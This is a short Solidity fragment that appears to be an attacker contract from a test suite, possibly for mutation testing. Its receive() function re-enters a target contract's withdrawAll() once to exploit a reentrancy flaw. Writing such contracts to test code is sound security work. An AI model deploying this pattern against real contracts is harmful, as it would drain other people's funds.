    address target;
    bool reentered;
    constructor(address _t) payable {
        target = _t;
        reentered = false;
    }
    // deposit then later call withdrawAll from test via .call with msg.sender = attacker
    receive() external payable {
        // attempt reentrancy only once
        if (!reentered) {
            reentered = true;
            // check credit via autogenerated getter; if >0 then re-enter
            uint256 cr = C(target).credit(address(this));
            if (cr > 0) {
                // call withdrawAll again to exploit the mutant ordering
                (bool ok,) = target.call(abi.encodeWithSignature("withdrawAll()"));
                // ignore ok; revert would revert outer call too
            }
        }
    }
}

